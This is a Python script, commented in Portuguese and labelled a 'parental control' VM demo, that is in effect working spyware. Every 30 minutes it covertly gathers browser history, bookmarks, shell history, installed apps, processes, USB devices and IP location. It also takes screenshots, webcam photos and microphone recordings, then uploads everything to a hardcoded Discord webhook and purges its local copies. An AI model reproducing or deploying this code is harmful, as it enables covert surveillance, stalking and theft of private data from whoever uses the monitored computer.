import os
import time
import schedule
import requests
import sqlite3
import platform
import json
from datetime import datetime
from PIL import ImageGrab
import cv2
import psutil
import subprocess
from cryptography.fernet import Fernet
import sounddevice as sd
import scipy.io.wavfile as wav
import numpy as np
import shutil

# ==================== CONFIGURAÇÕES ====================
LOG_DIR = "logs"
REPORT_DIR = "relatorios"
AUDIO_DIR = "audios"
MAX_LOG_AGE_DAYS = 7
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1459232383445500128/UysW7g1xigRBIHf1nSv7sjyZL-U6mCW5PGSSNyG-Us5HW4KDhOw1JZLT7O_V-W97fzxS"  # <- SUBSTITUI AQUI
ENCRYPTION_KEY = Fernet.generate_key()
TEMPO_INICIO = time.time()

# ==================== SETUP ====================
def setup():
    """Cria pastas necessárias."""
    global cipher_suite
    cipher_suite = Fernet(ENCRYPTION_KEY)
    os.makedirs(LOG_DIR, exist_ok=True)
    os.makedirs(REPORT_DIR, exist_ok=True)
    os.makedirs(AUDIO_DIR, exist_ok=True)
    print("[+] ✅ Pastas criadas com sucesso.")

# ==================== FUNÇÕES AUXILIARES ====================
def salvar_txt(nome_arquivo: str, dados: dict):
    """Salva dados em arquivo .txt."""
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        caminho = os.path.join(REPORT_DIR, f"{nome_arquivo}_{timestamp}.txt")
        
        with open(caminho, "w", encoding="utf-8") as f:
            f.write("=" * 60 + "\n")
            f.write(f"📅 {nome_arquivo.upper()} - {timestamp}\n")
            f.write("=" * 60 + "\n\n")
            
            for chave, valor in dados.items():
                f.write(f"🔹 {chave.upper()}\n")
                f.write("-" * 40 + "\n")
                
                if isinstance(valor, list):
                    for i, item in enumerate(valor, 1):
                        f.write(f"  {i}. {item}\n")
                elif isinstance(valor, dict):
                    for sub_chave, sub_valor in valor.items():
                        f.write(f"  • {sub_chave}: {sub_valor}\n")
                else:
                    f.write(f"  {valor}\n")
                f.write("\n")
        
        print(f"[+] 📄 Arquivo salvo: {caminho}")
        return caminho
    except Exception as e:
        print(f"[-] ❌ Erro ao salvar .txt: {e}")
        return None

def enviar_discord_texto(titulo: str, descricao: str):
    """Envia apenas texto para o Discord."""
    try:
        embed = {
            "embeds": [{
                "title": titulo,
                "description": descricao[:4000],
                "color": 3447003,
                "timestamp": datetime.utcnow().isoformat(),
                "footer": {"text": "🛡️ Controle Parental"}
            }]
        }
        
        response = requests.post(
            DISCORD_WEBHOOK_URL,
            json=embed,
            headers={"Content-Type": "application/json"}
        )
        
        if response.status_code == 204:
            print("[+] ✅ Mensagem enviada para o Discord!")
            return True
        else:
            print(f"[-] ❌ Erro Discord: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] ❌ Erro: {e}")
        return False

def enviar_discord_arquivo(arquivo_path: str, mensagem: str = ""):
    """Envia um arquivo para o Discord."""
    try:
        if not os.path.exists(arquivo_path):
            print(f"[-] ❌ Arquivo não encontrado: {arquivo_path}")
            return False
        
        with open(arquivo_path, "rb") as f:
            payload = {"content": mensagem} if mensagem else {}
            files = {"file": (os.path.basename(arquivo_path), f)}
            response = requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
        
        if response.status_code == 200:
            print(f"[+] ✅ Arquivo enviado: {os.path.basename(arquivo_path)}")
            return True
        else:
            print(f"[-] ❌ Erro ao enviar arquivo: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] ❌ Erro: {e}")
        return False

# ==================== 1. TEMPO DE USO ====================
def obter_tempo_uso():
    """Calcula tempo de uso do PC."""
    try:
        tempo_atual = time.time()
        tempo_uso_segundos = tempo_atual - TEMPO_INICIO
        
        horas = int(tempo_uso_segundos // 3600)
        minutos = int((tempo_uso_segundos % 3600) // 60)
        segundos = int(tempo_uso_segundos % 60)
        
        boot_time = datetime.fromtimestamp(psutil.boot_time())
        tempo_desde_boot = datetime.now() - boot_time
        
        resultado = {
            "tempo_sessao": f"{horas}h {minutos}m {segundos}s",
            "tempo_desde_boot": str(tempo_desde_boot).split('.')[0],
            "boot_time": boot_time.strftime("%Y-%m-%d %H:%M:%S")
        }
        
        print(f"[+] ⏱️ Tempo de uso: {resultado['tempo_sessao']}")
        return resultado
    except Exception as e:
        print(f"[-] ❌ Erro: {e}")
        return {"erro": str(e)}

# ==================== 2. CAPTURA DE ÁUDIO ====================
def capturar_audio(duracao=10, sample_rate=44100):
    """Grava áudio do microfone."""
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        nome_arquivo = os.path.join(AUDIO_DIR, f"audio_{timestamp}.wav")
        
        print(f"[+] 🎤 Gravando áudio por {duracao} segundos...")
        audio = sd.rec(int(duracao * sample_rate), samplerate=sample_rate, channels=1, dtype='int16')
        sd.wait()
        
        wav.write(nome_arquivo, sample_rate, audio)
        print(f"[+] ✅ Áudio salvo: {nome_arquivo}")
        return nome_arquivo
    except Exception as e:
        print(f"[-] ❌ Erro ao capturar áudio: {e}")
        return None

# ==================== 5. DISPOSITIVOS USB ====================
def listar_usb():
    """Lista dispositivos USB conectados."""
    try:
        sistema = platform.system()
        dispositivos = []
        
        if sistema == "Windows":
            comando = 'Get-PnpDevice -Class USB | Select-Object Status, FriendlyName | Format-Table -AutoSize'
            resultado = subprocess.run(
                ["powershell", "-Command", comando],
                capture_output=True, text=True, encoding='utf-8', errors='ignore'
            )
            linhas = resultado.stdout.strip().split('\n')
            dispositivos = [linha.strip() for linha in linhas if linha.strip() and "---" not in linha and "Status" not in linha]
            
        elif sistema == "Linux":
            resultado = subprocess.run(["lsusb"], capture_output=True, text=True)
            dispositivos = resultado.stdout.strip().split('\n')
        
        print(f"[+] 🔌 USB encontrados: {len(dispositivos)}")
        return dispositivos
    except Exception as e:
        print(f"[-] ❌ Erro: {e}")
        return []

# ==================== 6. LOCALIZAÇÃO ====================
def obter_localizacao():
    """Obtém localização via IP."""
    try:
        response = requests.get("http://ip-api.com/json/", timeout=10)
        dados = response.json()
        
        if dados["status"] == "success":
            localizacao = {
                "ip": dados.get("query", "?"),
                "cidade": dados.get("city", "?"),
                "regiao": dados.get("regionName", "?"),
                "pais": dados.get("country", "?"),
                "isp": dados.get("isp", "?"),
                "lat": dados.get("lat", 0),
                "lon": dados.get("lon", 0)
            }
            print(f"[+] 📍 Localização: {localizacao['cidade']}, {localizacao['pais']}")
            return localizacao
        return {"erro": "Falha"}
    except Exception as e:
        print(f"[-] ❌ Erro: {e}")
        return {"erro": str(e)}

# ==================== 9. PROCESSOS ====================
def listar_processos():
    """Lista processos ativos."""
    try:
        processos = []
        for proc in psutil.process_iter(['pid', 'name', 'cpu_percent', 'memory_percent']):
            try:
                info = proc.info
                if info['cpu_percent'] > 0 or info['memory_percent'] > 0.1:
                    processos.append(f"{info['name']} (PID:{info['pid']}) CPU:{info['cpu_percent']:.1f}% RAM:{info['memory_percent']:.1f}%")
            except:
                continue
        
        processos.sort(reverse=True)
        print(f"[+] 📊 Processos: {len(processos)}")
        return processos[:50]
    except Exception as e:
        print(f"[-] ❌ Erro: {e}")
        return []

# ==================== 10. HISTÓRICO DO TERMINAL ====================
def obter_historico_terminal():
    """Obtém comandos do terminal."""
    try:
        sistema = platform.system()
        comandos = []
        
        if sistema == "Windows":
            ps_history = os.path.expanduser(r"~\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt")
            if os.path.exists(ps_history):
                with open(ps_history, "r", encoding="utf-8", errors="ignore") as f:
                    comandos = [cmd.strip() for cmd in f.readlines()[-50:] if cmd.strip()]
            
        elif sistema == "Linux":
            for hist_file in ["~/.bash_history", "~/.zsh_history"]:
                path = os.path.expanduser(hist_file)
                if os.path.exists(path):
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        comandos.extend([cmd.strip() for cmd in f.readlines()[-50:] if cmd.strip()])
        
        print(f"[+] 💻 Comandos: {len(comandos)}")
        return comandos
    except Exception as e:
        print(f"[-] ❌ Erro: {e}")
        return []

# ==================== 12. INFO DO SISTEMA ====================
def obter_info_sistema():
    """Obtém informações do sistema."""
    try:
        mem = psutil.virtual_memory()
        disco = psutil.disk_usage('/')
        bateria = psutil.sensors_battery()
        
        info = {
            "so": f"{platform.system()} {platform.release()}",
            "hostname": platform.node(),
            "usuario": os.getlogin(),
            "cpu_uso": f"{psutil.cpu_percent()}%",
            "cpu_nucleos": psutil.cpu_count(),
            "ram_total": f"{mem.total / (1024**3):.1f} GB",
            "ram_uso": f"{mem.percent}%",
            "disco_total": f"{disco.total / (1024**3):.1f} GB",
            "disco_uso": f"{disco.percent}%",
            "bateria": f"{bateria.percent}%" if bateria else "N/A",
            "carregando": "Sim" if bateria and bateria.power_plugged else "Não"
        }
        
        print(f"[+] 🖥️ Info do sistema obtida")
        return info
    except Exception as e:
        print(f"[-] ❌ Erro: {e}")
        return {"erro": str(e)}

# ==================== 15. FAVORITOS ====================
def obter_favoritos():
    """Obtém favoritos do navegador."""
    try:
        sistema = platform.system()
        favoritos = []
        
        if sistema == "Windows":
            chrome_bookmarks = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\Bookmarks")
        else:
            chrome_bookmarks = os.path.expanduser("~/.config/google-chrome/Default/Bookmarks")
        
        if os.path.exists(chrome_bookmarks):
            with open(chrome_bookmarks, "r", encoding="utf-8") as f:
                dados = json.load(f)
                
                def extrair(node):
                    result = []
                    if isinstance(node, dict):
                        if node.get("type") == "url":
                            result.append(f"{node.get('name', '?')} - {node.get('url', '')[:60]}")
                        for child in node.get("children", []):
                            result.extend(extrair(child))
                    return result
                
                for key in dados.get("roots", {}):
                    favoritos.extend(extrair(dados["roots"][key]))
        
        print(f"[+] ⭐ Favoritos: {len(favoritos)}")
        return favoritos[:100]
    except Exception as e:
        print(f"[-] ❌ Erro: {e}")
        return []

# ==================== CAPTURAS ====================
def capturar_tela():
    """Captura screenshot."""
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        nome = os.path.join(REPORT_DIR, f"tela_{timestamp}.png")
        ImageGrab.grab().save(nome)
        print(f"[+] 🖼️ Tela capturada: {nome}")
        return nome
    except Exception as e:
        print(f"[-] ❌ Erro: {e}")
        return None

def capturar_camera():
    """Captura foto da câmera."""
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        nome = os.path.join(REPORT_DIR, f"camera_{timestamp}.jpg")
        
        print("[+] 📸 Abrindo câmera...")
        cap = cv2.VideoCapture(0)
        
        if not cap.isOpened():
            print("[-] ❌ Câmera não disponível")
            return None
        
        time.sleep(2)  # Aguarda câmera estabilizar
        
        ret, frame = cap.read()
        cap.release()
        
        if ret:
            cv2.imwrite(nome, frame)
            print(f"[+] ✅ Foto da câmera salva: {nome}")
            return nome
        else:
            print("[-] ❌ Falha ao capturar foto")
            return None
    except Exception as e:
        print(f"[-] ❌ Erro câmera: {e}")
        return None

def obter_historico_navegador():
    """Obtém histórico do navegador."""
    try:
        sistema = platform.system()
        historico = []
        
        if sistema == "Windows":
            chrome_history = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\History")
        else:
            chrome_history = os.path.expanduser("~/.config/google-chrome/Default/History")
        
        if os.path.exists(chrome_history):
            temp_db = os.path.join(REPORT_DIR, "temp_history.sqlite")
            shutil.copy2(chrome_history, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch')
                FROM urls ORDER BY last_visit_time DESC LIMIT 100
            """)
            
            for url, titulo, data in cursor.fetchall():
                historico.append(f"[{data}] {titulo[:40]} - {url[:60]}")
            
            conn.close()
            os.remove(temp_db)
        
        print(f"[+] 🌐 Histórico: {len(historico)} entradas")
        return historico
    except Exception as e:
        print(f"[-] ❌ Erro: {e}")
        return []

def obter_apps_instaladas():
    """Lista apps instaladas."""
    try:
        sistema = platform.system()
        apps = []
        
        if sistema == "Windows":
            import winreg
            for path in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", 
                        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        try:
                            subkey = winreg.OpenKey(key, winreg.EnumKey(key, i))
                            nome = winreg.QueryValueEx(subkey, "DisplayName")[0]
                            if nome:
                                apps.append(nome)
                        except:
                            continue
                except:
                    continue
        elif sistema == "Linux":
            resultado = subprocess.run(["dpkg", "--list"], capture_output=True, text=True)
            for linha in resultado.stdout.split('\n')[5:]:
                partes = linha.split()
                if len(partes) >= 2:
                    apps.append(partes[1])
        
        apps = list(set(apps))[:300]
        print(f"[+] 📦 Apps: {len(apps)}")
        return apps
    except Exception as e:
        print(f"[-] ❌ Erro: {e}")
        return []

def limpar_logs_antigos():
    """Remove logs antigos."""
    try:
        agora = time.time()
        limite = agora - (MAX_LOG_AGE_DAYS * 24 * 60 * 60)
        
        for pasta in [LOG_DIR, REPORT_DIR, AUDIO_DIR]:
            if os.path.exists(pasta):
                for arquivo in os.listdir(pasta):
                    caminho = os.path.join(pasta, arquivo)
                    if os.path.getmtime(caminho) < limite:
                        os.remove(caminho)
                        print(f"[+] 🗑️ Removido: {arquivo}")
        print("[+] ✅ Limpeza concluída")
    except Exception as e:
        print(f"[-] ❌ Erro: {e}")

# ==================== MONITORAMENTO PRINCIPAL ====================
def executar_monitoramento():
    """Executa monitoramento completo."""
    print("\n" + "=" * 70)
    print(f"[+] 🕐 MONITORAMENTO - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 70)
    
    # Coleta de dados
    tempo_uso = obter_tempo_uso()
    localizacao = obter_localizacao()
    info_sistema = obter_info_sistema()
    usb_devices = listar_usb()
    processos = listar_processos()
    comandos = obter_historico_terminal()
    favoritos = obter_favoritos()
    historico = obter_historico_navegador()
    apps = obter_apps_instaladas()
    
    # Capturas
    print("\n[+] 📸 Iniciando capturas...")
    foto_camera = capturar_camera()
    foto_tela = capturar_tela()
    audio = capturar_audio(duracao=10)
    
    # Salvar relatórios .txt
    print("\n[+] 📄 Salvando relatórios...")
    arquivos = []
    
    if historico:
        arq = salvar_txt("historico_navegador", {"sites_visitados": historico})
        if arq: arquivos.append(arq)
    
    if apps:
        arq = salvar_txt("apps_instaladas", {"aplicativos": apps})
        if arq: arquivos.append(arq)
    
    if processos:
        arq = salvar_txt("processos_ativos", {"processos": processos})
        if arq: arquivos.append(arq)
    
    if comandos:
        arq = salvar_txt("historico_terminal", {"comandos": comandos})
        if arq: arquivos.append(arq)
    
    if favoritos:
        arq = salvar_txt("favoritos", {"bookmarks": favoritos})
        if arq: arquivos.append(arq)
    
    if usb_devices:
        arq = salvar_txt("dispositivos_usb", {"dispositivos": usb_devices})
        if arq: arquivos.append(arq)
    
    # Relatório resumo
    resumo = {
        "tempo_uso": tempo_uso,
        "localizacao": localizacao,
        "sistema": info_sistema,
        "contagem": {
            "historico": f"{len(historico)} sites",
            "apps": f"{len(apps)} apps",
            "processos": f"{len(processos)} processos",
            "comandos": f"{len(comandos)} comandos",
            "favoritos": f"{len(favoritos)} favoritos",
            "usb": f"{len(usb_devices)} dispositivos"
        }
    }
    arq_resumo = salvar_txt("relatorio_completo", resumo)
    if arq_resumo: arquivos.append(arq_resumo)
    
    # ==================== ENVIAR PARA DISCORD ====================
    print("\n[+] 📤 Enviando para Discord...")
    
    # 1. Envia mensagem de texto com resumo
    titulo = f"📊 Monitoramento - {datetime.now().strftime('%d/%m/%Y %H:%M')}"
    descricao = f"""
**⏱️ Tempo de Uso**
• Sessão: {tempo_uso.get('tempo_sessao', '?')}
• Desde boot: {tempo_uso.get('tempo_desde_boot', '?')}

**📍 Localização**
• {localizacao.get('cidade', '?')}, {localizacao.get('pais', '?')}
• IP: {localizacao.get('ip', '?')}
• ISP: {localizacao.get('isp', '?')}

**🖥️ Sistema**
• {info_sistema.get('so', '?')}
• Usuário: {info_sistema.get('usuario', '?')}
• CPU: {info_sistema.get('cpu_uso', '?')}
• RAM: {info_sistema.get('ram_uso', '?')}
• Disco: {info_sistema.get('disco_uso', '?')}
• Bateria: {info_sistema.get('bateria', '?')} ({info_sistema.get('carregando', '?')})

**📈 Resumo**
• 🌐 Histórico: {len(historico)} sites
• 📦 Apps: {len(apps)} instaladas
• 📊 Processos: {len(processos)} ativos
• 💻 Terminal: {len(comandos)} comandos
• ⭐ Favoritos: {len(favoritos)} bookmarks
• 🔌 USB: {len(usb_devices)} dispositivos
"""
    enviar_discord_texto(titulo, descricao)
    
    time.sleep(1)  # Evita rate limit
    
    # 2. Envia foto da câmera (para ver quem está no PC)
    if foto_camera:
        enviar_discord_arquivo(foto_camera, "📸 **FOTO DA CÂMERA** - Quem está usando o PC:")
    
    time.sleep(1)
    
    # 3. Envia screenshot
    if foto_tela:
        enviar_discord_arquivo(foto_tela, "🖼️ **SCREENSHOT** - O que está na tela:")
    
    time.sleep(1)
    
    # 4. Envia áudio
    if audio:
        enviar_discord_arquivo(audio, "🎤 **ÁUDIO** - Gravação ambiente (10s):")
    
    time.sleep(1)
    
    # 5. Envia arquivos .txt
    for arq in arquivos:
        enviar_discord_arquivo(arq)
        time.sleep(0.5)
    
    # Limpeza
    limpar_logs_antigos()
    
    print("\n" + "=" * 70)
    print(f"[+] ✅ MONITORAMENTO CONCLUÍDO")
    print("=" * 70 + "\n")

# ==================== MAIN ====================
if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║             🛡️  CONTROLE PARENTAL - VM DEMO  🛡️               ║
    ╠═══════════════════════════════════════════════════════════════╣
    ║  Funcionalidades:                                             ║
    ║  • Tempo de uso do PC                                         ║
    ║  • Captura de áudio (microfone)                               ║
    ║  • Dispositivos USB conectados                                ║
    ║  • Localização geográfica (via IP)                            ║
    ║  • Processos em execução                                      ║
    ║  • Histórico do terminal                                      ║
    ║  • Informações do sistema                                     ║
    ║  • Favoritos do navegador                                     ║
    ║  • Screenshot + Foto da câmera                                ║
    ╠═══════════════════════════════════════════════════════════════╣
    ║  ⚠️  APENAS PARA DEMONSTRAÇÃO TÉCNICA EM VM                   ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    
    setup()
    
    # Agenda execução a cada 30 minutos
    schedule.every(30).minutes.do(executar_monitoramento)
    
    # Executa imediatamente
    executar_monitoramento()
    
    # Loop principal
    print("[+] 🔄 Aguardando próxima execução (a cada 30 min)...")
    print("[+] 💡 Pressione Ctrl+C para parar\n")
    
    while True:
        schedule.run_pending()
        time.sleep(1)
